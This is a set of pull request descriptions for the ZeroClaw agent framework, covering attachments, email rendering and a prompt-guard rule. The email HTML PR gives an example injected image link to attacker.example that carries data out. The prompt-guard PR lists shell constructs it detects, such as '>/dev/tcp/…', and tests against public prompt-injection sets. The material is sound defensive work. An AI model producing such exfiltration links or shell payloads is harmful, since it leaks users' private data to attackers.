- **Beyond CI, what did you manually verify?** Ran a `ci-all` build of this branch live for several hours in Signal DMs against signal-cli 0.14.7 on a dedicated test account. Outbound: the agent sent two different attachment types, and both arrived as real Signal attachments with the marker text removed. After the delivery-instructions change, a plain-language request that did not mention markers (asking the agent to tar and compress several screenshots from its workspace and send them) produced the archive and delivered it as a real Signal document attachment; when extracted, it contained the expected files. Inbound: a photo of a printed document in several languages was read and every language translated correctly; a photo of a handwritten note in cursive and print was transcribed correctly; text-only follow-ups were correctly told no new image was attached until the shared image-history behavior described above set in. The forward, re-sent image, and 12 MP findings are under "Known behavior outside this PR". Not verified live: inbound documents and voice notes, sending a received file back (covered by a unit test), group conversations, files near the 100 MiB limit, a signal-cli daemon on a separate host.
- **Tested revision, interface, and evidence path:** `ci-all` builds of this branch; the live daemon runs a build of this commit's code, made just before it was committed, so it reports `v0.8.5-432-g32f90e9ba-dirty`; later changes to the commit were docs only. `channel` = `signal` (DM); signal-cli 0.14.7
- **Screenshot or exact-output evidence:** N/A
- **Action or changed state and observed result:** Outbound: a plain-language request to archive several workspace files was delivered as a Signal document attachment, and the extracted archive held the expected files. Inbound: a photo of a multilingual printed document was read and translated in full, and a photo of a handwritten note in cursive and print was transcribed correctly.
- **If any command was intentionally skipped, why:** Full workspace `cargo nextest run` was not run locally; CI runs it. `scripts/ci/docs_quality_gate.sh` was run up to its markdownlint step, which was then run directly (the container lacked Python).

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? `Yes`
- New external network calls? `No`
- Secrets / tokens / credentials handling changed? `No`
- PII, real identities, or personal data in diff, tests, fixtures, or docs? `No`
- Prompt injection or untrusted model-visible text introduced/changed? `Yes`
- If any `Yes`, describe the risk and mitigation:
  - File system: inbound attachments are written to `<agent workspace>/signal_files/<uuid>_<basename>`; sender-supplied names are reduced to their final path component and UUID-prefixed. Outbound markers can read only regular files whose canonical path is inside the canonical workspace (absolute, `..`, and symlink escapes refused). Each file is capped at Signal's 100 MiB limit, and all attachments in one message at 100 MiB combined, in both directions. `getAttachment` responses are capped before they are buffered, and outbound reads are capped at the checked size. Saved names have `[`, `]`, and control characters replaced so their markers stay parseable. Downloads start only after the sender passes the allowlist/group checks and the message is not an approval reply.
  - Model-visible text / injection: outbound markers come from model output, which may be influenced by inbound content. Workspace confinement prevents exfiltrating host files outside the workspace; files inside the agent's workspace remain sendable, as on other channels. Failure logging records kind/outcome/reason only, never the target path; the user-visible note carries only a count. Attachment contents never reach logs: data URIs are redacted from signal-cli error text, and inbound failure logs carry signal-cli's error text as returned (with data URIs redacted and credentials scrubbed) and local I/O error causes, which do not include file paths.
  - Network: only additional JSON-RPC methods on the already-configured signal-cli daemon; outbound URL markers are refused rather than fetched.

## Compatibility (required)

- Backward compatible? `Yes`. Replies without media markers are sent byte-for-byte as before. With `ignore_attachments = false` (the default), attachment-only messages now reach the agent instead of being dropped.
- Config / env / CLI surface changed? `No`
- Rust/MSRV/toolchain floor changed? `No`
- If backward compatibility is `No` or either surface/floor question is `Yes`: exact upgrade steps for existing users: N/A

## Rollback (required for medium/high-risk PRs)

- **Fast rollback command/path:** `git revert <sha>`; text-only Signal behavior is the fallback.
- **Feature flags or config toggles:** `ignore_attachments = true` stops inbound downloads. Outbound has no toggle.
- **Observable failure symptoms:** `signal: skipping inbound attachment`, `signal: inbound attachment save failed; passing bytes only`, `signal: dropping unresolved outbound attachment marker` (check `reason`), `Signal RPC error` on `send`/`getAttachment`; growth of `<workspace>/signal_files/` (no retention is applied).

## Supersede Attribution (required only when `Supersedes #` is used)

N/A. `Supersedes #` is not used; #5832 is credited in the notes above as prior art with no code carried over.

prs.title: feat(skills): add built-in zeroclaw docs skill
prs.body:
## Summary

- **Base branch:** `master`
- **What changed and why:**
  - Embed a `zeroclaw-docs` skill that directs agents to the installed binary, configuration schema, active tools, and matching documentation instead of relying on model memory.
  - Add built-in skills at the lowest precedence without copying files into agent workspaces. Same-name workspace, community, and assigned-bundle skills still win. Plugin skills use qualified names.
  - Load the built-in instructions on demand in both Full and Compact prompt modes when `read_skill` is callable. Inline them when the provider or tool policy makes that loader unavailable, and refresh cached channel prompts when availability changes.
  - Expose the additive `built-in` origin through the effective-skills API, RPC, and dashboard client type. Existing operator skills retain their configured prompt behavior.
- **Scope boundary:** No new configuration keys, documentation mirror, fetch/cache helper, permission bypass, or live capability-readiness registry. The embedded instructions do not themselves make network calls or establish which capabilities are currently ready.
- **Blast radius:** Agents gain one lowest-precedence skill. The existing `read_skill` tool can also register in Full mode while an effective built-in requires on-demand loading. Runtime and channel prompts, skill reads, and effective-skill origin consumers are affected.
- **Linked issue(s):** Related #1948. Related #8367. The live capability-readiness scope of #8367 remains independent.

### What this does, simply

An agent helping you configure or diagnose ZeroClaw needs to know what your installed version actually supports. Its remembered documentation can describe another version, and a feature being documented does not mean the current agent has permission to use it.

This PR gives every agent a small built-in guide for finding the right sources before answering or acting. The guide comes with the binary, so you do not need to install or maintain a workspace copy. Your own skill with the same name takes precedence.

Normally the agent sees a short description and reads the full guide only when needed. If its provider or tool policy prevents that read, ZeroClaw includes the guide directly in the prompt instead. Switching providers cannot leave a cached prompt telling the agent to call a loader it no longer has. The guide remains instructions, not a new permission or an automatic check of live readiness.

### Scope and maintenance tradeoff

This is one embedded guide plus support in the existing skill resolver, prompt renderer, tool factory, and origin converters. The thirteen-file scope connects those existing consumers and tests; it does not introduce a second registry or a documentation service. Adding only the file would leave agents unable to discover or read it, and registering only the loader would leave unusable guidance when tools become unavailable. Future binary releases maintain the guide alongside the code. Live capability readiness remains separate.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** N/A. Focused tests exercise the built-in reads, override precedence, API conversion, and real channel provider-transition path directly.

### How I tested

- **CI checks relied on and why they cover this change:** [Current-head CI run 38520560736](https://github.com/zeroclaw-labs/zeroclaw/actions/runs/38520560736) is running on `85a0c291cf7235ef86cecc29ba4302967df23cca`. It checks formatting, lint, runtime/channel tests, platform builds and generated-catalog drift. [Earlier CI run 38511127863](https://github.com/zeroclaw-labs/zeroclaw/actions/runs/38511127863) passed on `455457b0264b3dc04dabfdfdecd5b9d0250a8cb3` before the localization repair.
- **Known CI coverage gap, if any:** The focused local selection is not a full workspace or platform run; current-head CI will supply the broader checks when it completes. The effective-skills converter test covers the API origin contract. This repair did not rerun an interactive dashboard smoke or local web build.
- **Commands run and tail output:** On revision `455457b0264b3dc04dabfdfdecd5b9d0250a8cb3`, whose tree is identical to the validated candidate:

```text
$ cargo nextest run --locked -p zeroclaw-runtime -p zeroclaw-channels -p zeroclaw-gateway --lib -E 'test(skill) | test(process_channel_message_telegram_system_prompt_is_byte_stable_across_turns) | test(process_channel_message_memory_recall_difference_keeps_system_byte_identical)'
Summary: 436 tests run: 436 passed (2 leaky), 7935 skipped
exit 0

$ rustfmt --edition 2024 --check crates/zeroclaw-runtime/src/skills/mod.rs crates/zeroclaw-runtime/src/tools/mod.rs crates/zeroclaw-channels/src/orchestrator/mod.rs

The retained `process_channel_message_refreshes_available_skills_after_new_session` test checks the original provider-transition assertion, the inline built-in body, and Full-mode loader loss and restoration. Two unchanged Discord skill-command tests passed but nextest marked them leaky. A macOS compact-unwind linker-size warning was nonfatal.

The localization repair uses the existing tool-description Fluent loader in the reader and both prompt paths, with `tool-read-skill` in the canonical English catalog and its generated mirror. Eleven focused runtime/channel tests passed on `a515ad0f1d0bb4a2043580a96351a1deca17ee2a`. The final commit only synchronizes the generated mirror; `cargo run --offline --locked -p xtask --bin generate -- installers tools-en-ftl --check` reports `ok: tools-en-ftl in sync` and exits 0 on the final tree.

The original branch also recorded clippy, documentation gates, a web build, and additional tests on its earlier head. Those historical runs are not presented as validation of this repaired revision.

- **Beyond CI, what did you manually verify?** Source inspection traced the effective-tool callback through the shared renderer and channel prompt refresh, checked operator precedence, and checked version-matching guidance. No current manual interface smoke was performed.
- **Visual interface evidence:** N/A. No layout, styling, or interaction implementation changes; the web change extends the API origin type.

The scoped tool registry still enforces current policy; unavailable tools cause inline guidance, not a bypass. Repository-owned instructions become model-visible either through a read or the fallback prompt. They require current-version verification, preserve security policy, treat fetched text as reference material, prohibit secret disclosure, and require confirmation for disruptive or destructive operations. The dashboard client type includes that value.

## Rollback (required for medium/high-risk PRs)

prs.title: feat(tools): send files through send_via under the read policy
prs.body:
## Summary

- **Base branch:** `master`
- **What changed and why:**
  - `send_via` gains `attachments`, a list of file paths, for an immediate send (`target` + `body`). Today an agent on the email channel cannot send a file at all. Since #9993, outbound attachment bytes come only from `MediaAttachment.data`, and nothing loads a workspace file explicitly for the agent.
  - **Loading.** A new helper (`helpers/outbound_attachment.rs`) checks each path in this order:
    1. Refuse an empty path, a NUL byte or a `..` component.
    2. `is_path_allowed`, then `resolve_tool_path`, then canonicalise.
    3. `is_resolved_path_readable`, the read check `file_read` uses. It is deliberately not the write check the upload tools use, which admits write-only roots.
    4. Refuse runtime config files, and require a regular file.
    5. Open without following symlinks and read with a bounded reader, so the size check applies to the bytes actually read.

    It then builds the `MediaAttachment` directly. `MediaAttachment::from_file` is never called, so the file isn't opened a second time after the check.
  - **Gates, all checked before any file is read.** Any failure sends nothing:
    - the call is an immediate send;
    - the channel declares the new `Channel::supports_outbound_attachments()`;
    - the recipient's peer group sets `attachments_enabled` (default `false`);
    - the call stays within the `[tools.send_via]` limits (default 10 files, 10 MiB each, 20 MiB per call).
  - **Capability.** `Channel::supports_outbound_attachments()` defaults to `false`. Email (IMAP+SMTP), Slack and Matrix return `true`, and `PacedChannel` forwards it. Every other channel, including WASM plugin channels, is refused by name rather than silently dropping the files.
  - **Text in a `send_via` body never becomes an upload.** `SendMessage` gains `inline_attachments` (default `true`, so ordinary replies keep their markers). When it is `false`, every channel that turns message text into uploads sends the text as text instead: Slack, Matrix, Telegram (markers, and its bare-path and `file://` fallback), WeChat, QQ, Lark, WhatsApp Web, WhatsApp Cloud and Discord. Explicit attachments are unaffected. `send_via` sends with it off, so files go through `attachments` and the gates above, and nowhere else. This replaces a body detector, because channels parse markers in too many ways to mirror: rescanning inside unrecognised brackets, joining text after stripping tool-call tags or embeds, and uploading a body that is just a path.
  - **Approval prompts go out with inline attachments off** too. They are built by a shared `approval_prompt_message` helper on Slack, Discord, WhatsApp Web, WhatsApp Cloud and Matrix. Their text includes a tool's arguments, so a file marker in an argument is now shown, not uploaded.
  - **Plugin channels** receive the body as written: the plugin interface has no field for the switch, and adding one changes the plugin ABI. Plugins run with no access to host files. The docs say so.
  - The refusals this change adds use Fluent keys, and the attachment load runs in one `spawn_blocking`.
  - **Slack checks its own limits before posting.** That means at most 8 explicit files, none empty and none over 20 MiB. Before, it posted the text and then failed on a bad file, or silently dropped files beyond 8.
- **Scope boundary:**
  - No attachments on a routed reply (`send_via` without `body`).
  - Telegram and the other chat channels are left for later. Telegram already has `send_document_bytes`, so it can opt in by returning `true` and sending `SendMessage.attachments`, with no change to `send_via`.
  - No HTML body (#11992), no CC (#9506), no inbound attachments (#11745, #11746).
  - Recipients stay limited to peer groups.
- **Blast radius:**
  - `zeroclaw-api`: one trait method with a default, and `SendMessage.inline_attachments` (default `true`) with a builder.
  - `zeroclaw-config`: `PeerGroupConfig.attachments_enabled`, and `[tools.send_via]` inside `BuiltinToolsConfig`. Because that struct denies unknown fields, `migration.rs` now drops a malformed `[tools.<name>]` table on its own instead of the whole `[tools]` table. The tool selection survives a bad limit value.
  - `zeroclaw-tools`: `send_via`, the helper, and `detect_mime` made `pub(crate)`.
  - `zeroclaw-channels`: the three capability overrides, the `PacedChannel` forward, Slack's checks before posting, the `inline_attachments` gate in nine channels, and the approval-prompt helper.
  - `zeroclaw-runtime`: the registry passes the limits to the tool.
- **Linked issue(s):** Closes #11996. Related #9993, Related #11992, Related #11990

### What this does, simply

An assistant can now send a file with a message it sends to a known contact, for example "email the client the report", as long as the operator allowed it for that contact. The file has to be one the assistant may read anyway, configuration files are refused by path, sizes are capped, and if anything is wrong nothing is sent at all. Channels that can't carry files are refused up front, not silently dropped. Text the assistant writes in such a message is always sent as text, so a `[FILE:...]` code or a bare path in it can't make the channel upload a file. Every file goes through the checks above.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** Optional. The unit tests cover every gate with a channel stub that records what it was asked to send.
- **Interface(s) exercised:** `channel` (`email`).
- **Setup / preconditions:** an IMAP+SMTP email channel, a peer group for it with `attachments_enabled = true`, and a PDF in the agent's workspace.
- **Steps to run:** Ask the agent to send the PDF to that peer with `send_via`. Then ask it to send `config.toml`, and to send the PDF to a peer group without the opt-in.
- **Expected on this branch (after):** The PDF arrives as a real attachment. The other two are refused, and nothing is sent.
- **Prior behavior on `master` (before):** `send_via` has no way to attach the file. The agent pastes text or says it cannot.

### How I tested

- **CI checks relied on and why they cover this change:** `cargo test` on the five touched crates, and Docs for the two pages.
- **Known CI coverage gap, if any:** `markdownlint-cli2` can't run on my machine (no Node); CI's docs job covers it.
- **Commands run and tail output:**

```text
cargo fmt --all -- --check                                          ok
cargo test -p zeroclaw-tools --lib                                  ok. 1378 passed; 0 failed; 3 ignored
cargo test -p zeroclaw-config --lib                                 ok. 1817 passed; 0 failed
cargo test -p zeroclaw-config --test migration                      ok. 99 passed; 0 failed
cargo test -p zeroclaw-api --lib                                    ok. 323 passed; 0 failed
cargo test -p zeroclaw-channels --lib --features "channels-full channel-matrix channel-wechat whatsapp-web channel-telegram channel-email"
                                                                    ok. 3815 passed; 0 failed; 6 ignored
cargo test -p zeroclaw-runtime --lib -- tools::                     ok. 767 passed; 0 failed; 1 ignored
cargo check -p zeroclaw --tests                                     ok
cargo clippy -p zeroclaw-api -p zeroclaw-config -p zeroclaw-tools -p zeroclaw-plugins -p zeroclaw-runtime --tests --no-deps -- -D warnings   ok
cargo clippy -p zeroclaw-channels --tests --no-deps --features "<same as above>" -- -D warnings    ok
RUSTDOCFLAGS="-D warnings" cargo doc --no-deps -p zeroclaw-api -p zeroclaw-config -p zeroclaw-tools   ok
bash scripts/ci/comment_hygiene_gate.sh                             passed
# after the review changes, at 718aed5636
cargo test -p zeroclaw-config --lib                                 ok. 1819 passed; 0 failed
cargo test -p zeroclaw-config --test migration                      ok. 99 passed; 0 failed
cargo clippy -p zeroclaw-config --tests --no-deps -- -D warnings     ok
RUSTDOCFLAGS="-D warnings" cargo doc --no-deps -p zeroclaw-config   ok
```

- **Beyond CI, what did you manually verify?** The new tests cover:
  - **`send_via`, success:** delivery through a capable, opted-in channel, with file name, MIME and bytes checked; an empty list sends a plain message.
  - **`send_via`, refusals, with nothing sent in each case:**
    - an incapable channel, and a group that hasn't opted in. Both ask for a missing file, which proves the check runs before any read;
    - the opt-in through the channel-alias target path;
    - routing mode, and a wrong argument type;
    - each of the three limits;
    - the read policy: outside the workspace, `..`, a directory, a symlink pointing outside, and a runtime config file;
  - **`send_via` sends its body with inline attachments off:** `"report [FILE:/x]"`, a tool-tag splice and a bare path all arrive as unchanged text with no attachments.
  - **Each gated channel:** a marker body (and on Telegram and WeChat a bare path or `file://` URL) with the switch off goes out as literal text with no upload, while explicit attachments still go out. Slack and Matrix check this end to end against a mock server.
  - **Approval prompts:** a file marker in a tool argument stays in the prompt text and is not uploaded (Slack end to end, WhatsApp Web through its send hook, Matrix and the shared helper directly).
  - **Schema:** the description shows the configured limits.
  - **The loading helper:** 4 unit tests.
  - **Slack:** more than 8 files, an empty file and an oversized file are each refused before any request reaches the mock server.
  - **Config:** a malformed `[tools.send_via]` value, or a misspelt key such as `max_attachment_byte`, drops that table on its own and keeps the tool selection. The drop counts as degraded security, so the daemon won't start without `--allow-degraded-security`: the defaults can be looser than a tightened limit such as `max_attachments = 0`. The same holds when this table is set and a mistake elsewhere drops the whole `[tools]` table.

  Not verified: a live send through a real mailbox on this branch.
- **Visual interface evidence:** N/A
- **Tested revision, interface, and evidence path:** the commands above at `bbbac5a019`, and the `zeroclaw-config` tests, clippy and docs again at `718aed5636` after the review changes. Tool and channel unit tests, and the Slack and Matrix mock servers; no user-visible interface state changed.
- **Screenshot or exact-output evidence:** N/A, as above.
- **Action or changed state and observed result:** N/A; the behaviour checks are the tests listed above.
- **If any command was intentionally skipped, why:** `markdownlint-cli2`, because Node isn't installed on my machine; CI's docs job runs it. A live send through a real mailbox wasn't run on this branch.

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? Yes. A model-called tool can now read files to send them. This is limited to `file_read`'s read policy, with runtime config refused by path (a copy or hard link inside the workspace is not recognised, and `file_read` could read it anyway), a per-group opt-in that is off by default, and size caps. The read is bounded, happens once after the check, and doesn't follow symlinks.
- New external network calls? No. Files go to recipients the agent could already message.
- Secrets / tokens / credentials handling changed? No. Runtime config files are refused explicitly.
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No (`example.com` and temp dirs).
- Prompt injection or untrusted model-visible text introduced/changed? Yes, and this narrows the risk. An injected instruction can no longer get files out through text in a `send_via` body or in a tool's arguments shown in an approval prompt, and the explicit path is off by default per recipient. #11990 lets an operator remove `send_via` from an untrusted channel's turns entirely.

## Compatibility (required)

- Backward compatible? Yes, with two changes in behaviour. A `send_via` body is now always sent as text: a file marker or bare path in it is no longer uploaded. And approval prompts show file markers from tool arguments as text instead of uploading them.
- Config / env / CLI surface changed? Yes. Two new optional settings: `attachments_enabled` on peer groups (default `false`), and `[tools.send_via]` with three limits. Existing configs load unchanged.
- Rust/MSRV/toolchain floor changed? No

## Rollback (required for medium/high-risk PRs)

- **Fast rollback command/path:** `git revert <sha>`, or leave `attachments_enabled` off, which is the default.
- **Feature flags or config toggles:** `attachments_enabled` per peer group.
- **Observable failure symptoms:**
  - A `send_via` refusal naming the channel ("cannot carry attachments"), the peer group ("not enabled"), a limit, or the path.
  - A file marker or path showing as plain text in a `send_via` message or an approval prompt is the intended behaviour.

prs.title: fix(channels/email): build the HTML part from Markdown structure only
prs.body:
## Summary - **Base branch:** `master` - **What changed and why:** - The email channel's HTML part is built from Markdown structure only. `markdown_to_html` now filters `pulldown-cmark`'s events before rendering: - Raw inline HTML is dropped, keeping the text between tags; `
` becomes a line break. - A raw HTML block is rendered as text. - An image is kept only for an inline attachment (`cid:`) or an `https` URL whose host is on the channel's new `html_image_domains`, which also covers subdomains. Any other image is reduced to its alt text. - A link is kept only for `http`, `https`, `mailto` and `tel`. Any other target is reduced to the link text. - Why: the agent's text can be steered by the mail it answers, and until now raw HTML and arbitrary image URLs went into the HTML part unchanged. A remote image is fetched by the reader's mail client, so an injected `![](https://attacker.example/p.png?d=...)` or `` was a way to send data out. - **Scope boundary:** - The plain-text part is unchanged (the agent's text as written; this change filters only the generated HTML part). - Inbound handling is unchanged. - No new dependency: the filter runs on the parser's event stream, and `push_html` still does the escaping. - Agent-written HTML bodies and operator templates are proposed separately in #11992. - **Blast radius:** the HTML part of every message the IMAP+SMTP email channel sends. Headings, emphasis, lists, tables, code and explicit safe-scheme links retain their formatting. Bare email autolinks such as `` currently become readable text because the filter rejects the parser's scheme-less destination. What changes is raw HTML in the agent's text and images from unlisted hosts. - **Linked issue(s):** Closes #11991. Related #11992 ### What this does, simply When the assistant replies by email, its text is turned into a formatted email. Until now, any HTML or image link in that text went out as-is. If someone tricked the assistant with an email, they could make it add an invisible image whose web address carries private information, and the reader's mail program would send it to them when loading the image. Now only formatting comes through. Images are allowed only if they're attached to the email or hosted on sites the operator lists, and odd links are reduced to plain text. ## Testing (required) ### How you can test (when useful) - **Reviewer testing requested?** N/A. The unit tests cover each rule, plus one sent message end to end. ### How I tested - **CI checks relied on and why they cover this change:** `cargo test` on `zeroclaw-channels` and `zeroclaw-config`; Docs for the markdown change. - **Known CI coverage gap, if any:** `markdownlint-cli2` can't run on my machine (no Node); CI's docs job covers it. - **Commands run and tail output:** ```text cargo fmt --all -- --check ok cargo test -p zeroclaw-config --lib -- generated_config_fields_keep_operator_descriptions test result: ok. 1 passed; 0 failed cargo test -p zeroclaw-channels --lib -- email_channel test result: ok. 80 passed; 0 failed cargo clippy -p zeroclaw-config -p zeroclaw-channels --tests --no-deps -- -D warnings ok RUSTDOCFLAGS="-D warnings" cargo doc --no-deps -p zeroclaw-channels -p zeroclaw-config ok bash scripts/ci/comment_hygiene_gate.sh passed ``` - **Beyond CI, what did you manually verify?** New tests: - raw inline HTML dropped with its text kept - `
` becomes a line break - a raw HTML block shown as text - remote images reduced to alt text: an unlisted host, `http` on a listed host, a look-alike host, a userinfo trick (`https://listed@attacker/`) and `data:` - listed hosts, their subdomains and `cid:` kept; no list means `cid:` only - `javascript:` links reduced to text while `https` links stay - tables and emphasis still render - a sent message carries no `` in its HTML part Negative check: with the previous `markdown_to_html` restored, 7 of the 8 new tests fail. The eighth, tables and emphasis, passes both ways, since that behaviour doesn't change. Not verified: a live send on this branch. - **Visual interface evidence:** N/A (mail HTML structure; the tests assert the rendered markup). ## Security & Privacy Impact (required) - New permissions, capabilities, or file system access scope? No - New external network calls? No. This removes a path by which outbound mail made the reader's client fetch arbitrary URLs. - Secrets / tokens / credentials handling changed? No - PII, real identities, or personal data in diff, tests, fixtures, or docs? No - Prompt injection or untrusted model-visible text introduced/changed? No. This limits what model-written text can put in outbound HTML. ## Compatibility (required) - Backward compatible? Mostly. Standard Markdown formatting and explicit safe-scheme links remain; bare email autolinks currently lose clickability. Raw HTML in the agent's text is no longer sent as markup, and remote images need their host on `html_image_domains`. - Config / env / CLI surface changed? Yes: one optional key, `html_image_domains` on `[channels.email.]`, empty by default. - Rust/MSRV/toolchain floor changed? No ## Rollback (required for medium/high-risk PRs) Low risk: `git revert `. - **Observable failure symptoms:** an expected image showing as its alt text means its host is not on `html_image_domains`.

prs.body:
## Summary

- **Base branch:** `master`
- **What changed and why:**
  - New per-channel flag `quote_original` on `[channels.email.<alias>]`, off by default. When it is on, a reply to a message the channel received quotes that message below the agent's text, the way mail clients do: an `On <date>, <sender> wrote:` line, then the original as `>` lines in the plain part and as a `<blockquote>` in the HTML part, HTML-escaped. Replies already thread through `In-Reply-To` / `References`, but the body was only the agent's text, so the reader had nothing under the answer.
  - The quote is what the channel itself parsed from the inbound message: sender display name, `Date` and body text. It's held in a bounded in-memory map keyed by Message-ID: 256 messages, oldest dropped first, each quote capped at 20,000 characters on a char boundary. The map is filled in `dispatch_email` after the allowlist and duplicate checks, so a blocked sender's mail is never stored.
  - It deliberately doesn't use `ChannelMessage.content`, which the runtime may have enriched by the time `SendMessage::reply_to` runs, and it doesn't add a field to the channel-neutral `SendMessage`.
- **Scope boundary:**
  - No CC or reply-all; that's #9506.
  - No quoting across restarts: a reply to a message received before the daemon restarted goes out without a quote, and the docs say so.
  - The original's HTML is not quoted verbatim; the quote is built from the parsed text.
  - `send_via`, cron announcements and other non-reply sends are unchanged. `build_email_message` builds outbound IMAP+SMTP email bodies. Gmail Push sends separately through the Gmail API and is unchanged by this PR.
- **Blast radius:** `zeroclaw-config` (one `EmailConfig` field) and `zeroclaw-channels` (`email_channel.rs`). No API or orchestrator change. With the flag off, the outbound plain and HTML bodies are exactly what they are today. Several open email-channel PRs also edit `email_channel.rs` (#11746, #11748, #11750, #11752, #11762, #11763); whichever lands second rebases, and this change sits in its own functions to keep that small.
- **Linked issue(s):** Closes #11938. Related #9506

### What this does, simply

When an assistant answers an email, the reply now can look like a normal email reply: the assistant's answer on top, and the message it's answering quoted underneath. Without it, someone reading "yes, done" has to dig through their sent folder to see what it refers to. It's a switch per mailbox and off unless you turn it on. Only messages the assistant received since it last started can be quoted.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** N/A. One test drives a raw email through dispatch and `SendMessage::reply_to` to composed reply text; a separate test checks the serialized MIME message from `build_email_message`.

### How I tested

- **CI checks relied on and why they cover this change:** `cargo test` on `zeroclaw-channels` and `zeroclaw-config`; Docs for the markdown change.
- **Known CI coverage gap, if any:** `markdownlint-cli2` couldn't run locally (no Node); the docs-quality gate's em-dash check passed and CI's docs job covers the lint.
- **Commands run and tail output:**

```text
cargo fmt --all -- --check                                                    ok
cargo test -p zeroclaw-config --lib -- generated_config_fields_keep_operator_descriptions
  test result: ok. 1 passed; 0 failed
cargo test -p zeroclaw-channels --lib -- email_channel
  test result: ok. 81 passed; 0 failed
cargo clippy -p zeroclaw-config -p zeroclaw-channels --tests --no-deps -- -D warnings   ok
RUSTDOCFLAGS="-D warnings" cargo doc --no-deps -p zeroclaw-channels -p zeroclaw-config  ok
bash scripts/ci/comment_hygiene_gate.sh                                        passed
```

- **Beyond CI, what did you manually verify?** New tests:
  - the flag defaults off
  - the exact plain and HTML shape of a quoted reply, with HTML escaping
  - a reply without a `Date` still names the sender
  - no quote when the flag is off, the message is unknown, or the send has no `in_reply_to`
  - the quote is present in the sent message's wire form
  - a raw email through `dispatch_email` and `SendMessage::reply_to` produces the quote
  - a blocked sender's mail is never stored
  - eviction past 256 messages
  - the 20,000-character cut lands on a char boundary

  Not verified: a live reply on this branch.
- **Visual interface evidence:** N/A (mail body text; the tests assert the exact plain-text output and the HTML structure).

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No
- New external network calls? No
- Secrets / tokens / credentials handling changed? No
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No (fixtures use `example.invalid`)
- Prompt injection or untrusted model-visible text introduced/changed? No. The quoted text goes only into the outbound mail; it is never fed back to the model. The original is HTML-escaped in the HTML part.

## Compatibility (required)

- Backward compatible? Yes
- Config / env / CLI surface changed? Yes: one optional key, `quote_original`, default `false`. Existing configs are unaffected.
- Rust/MSRV/toolchain floor changed? No

## Rollback (required for medium/high-risk PRs)

Low risk: set `quote_original = false`, or `git revert <sha>`.

prs.title: fix(security): stop treating a bare semicolon or pipe as command injection
prs.body:
## Summary

- **Base branch:** `master`
- **What changed and why:** The prompt guard's command-injection rule treated any bare `;` or `|` as a shell construct, so ordinary sentences, tables, signatures and tool output came back `Suspicious`, or `Blocked` under a block threshold below 0.6. This drops the two single-character tokens, and with them the `| head` / `| tail` / `| grep` exemption that only existed for `|`. The multi-character constructs stay: backtick, `$(`, `&&` (with its short-text exemption), `||`, `>/dev/` and `2>&1`. On the public sets in #12066, this removes every false flag in the clean emails (57 of 78 to 0) and clean tool results (162 of 1,054 to 0), with no lost detection.
- **Scope boundary:**
  - Only `check_command_injection` changes. The other five categories, the scores, and the block comparison stay as they are.
  - The meaning of the guard's sensitivity setting is a separate issue (#12067) and isn't touched here.
- **Blast radius:** `PromptGuard::scan`, whose only production caller is the untrusted SOP trigger screening in `ContentSafety::screen_event`.
- **Linked issue(s):** Related #12066. Related #12067.

### What this does, simply

Before an outside message can start an automated procedure, a safety check looks for signs of an attack. One of its rules treated every semicolon and every `|` character as a sign of a hidden shell command, so most normal emails and tables looked suspicious. The rule now looks only for the shell patterns that ordinary text doesn't use.

## Testing (required)

### How you can test (when useful)

- **Reviewer testing requested?** No. The new unit tests cover both directions.

### How I tested

- **CI checks relied on and why they cover this change:** `cargo test` for `zeroclaw-runtime`, which holds the guard and its only caller, and clippy.
- **Commands run and tail output:**

```text
$ cargo fmt --all -- --check
(clean)
$ cargo test -p zeroclaw-runtime --lib -- security::
test result: ok. 380 passed; 0 failed; 1 ignored; 0 measured; 5493 filtered out; finished in 1.08s
$ cargo clippy -p zeroclaw-runtime --tests --no-deps -- -D warnings
Finished `dev` profile [unoptimized + debuginfo] target(s) in 1m 48s
```

- **Beyond CI, what did you manually verify?**
  - `prose_punctuation_is_not_command_injection`: a sentence with a semicolon, a pipe table and a pipe-separated signature all stay `Safe` under `Block` at 0.1.
  - `shell_constructs_still_flag_command_injection`: `$(…)`, `2>&1`, `>/dev/tcp/…` and a backtick each still flag, with exactly one pattern.
  - The measurement in #12066 uses the public BIPIA and InjecAgent sets only.
- **Visual interface evidence:** N/A

## Security & Privacy Impact (required)

- New permissions, capabilities, or file system access scope? No
- New external network calls? No
- Secrets / tokens / credentials handling changed? No
- PII, real identities, or personal data in diff, tests, fixtures, or docs? No. The test strings are made up and use `example.com` and a documentation IP range.
- Prompt injection or untrusted model-visible text introduced/changed? Yes, the screening of untrusted SOP input gets narrower. The two dropped tokens caught none of the attack samples measured in #12066, and every construct that did catch one is kept. Shell safety for tool arguments stays with the shell tool's command policy, which this guard doesn't replace.

## Compatibility (required)

- Backward compatible? Yes. Content with a bare `;` or `|` and no other match is now `Safe` instead of `Suspicious` or `Blocked`.
- Config / env / CLI surface changed? No
- Rust/MSRV/toolchain floor changed? No

## Rollback (required for medium/high-risk PRs)

- **Fast rollback command/path:** `git revert <sha>`.
- **Feature flags or config toggles:** none. `[sop] untrusted_input_guard = "warn"` (the default) only logs.
- **Observable failure symptoms:** a shell-shaped payload that relied on `;` or `|` alone is no longer logged as `command_separator` or `pipe_operator`.
